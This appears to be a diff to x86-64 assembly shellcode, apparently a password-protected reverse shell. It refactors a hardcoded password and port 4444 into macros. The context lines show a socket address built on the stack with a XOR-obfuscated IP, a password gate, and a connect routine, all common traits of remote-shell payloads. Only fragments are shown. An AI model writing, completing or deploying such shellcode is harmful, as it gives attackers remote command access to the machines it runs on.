@@ -1,9 +1,12 @@
 global _start
 
+%define pass "pass"
+%define port 0x5c11  ; htons(4444)
+
 %define _START
 _start:
     jmp real_start
-    password: db "pass"
+    password: db pass
     pass_len: db $-password
 
 real_start:
@@ -49,7 +52,7 @@ connect:
     push rax          ; sin_zero
     push 0x10ffff70   ; sin_addr (xored)
     xor dword [rsp], 0x11ffff0f ; recover sin_addr
-    push word 0x5c11  ; htons(4444)
+    push word port
     push word 2
 
     ; connect
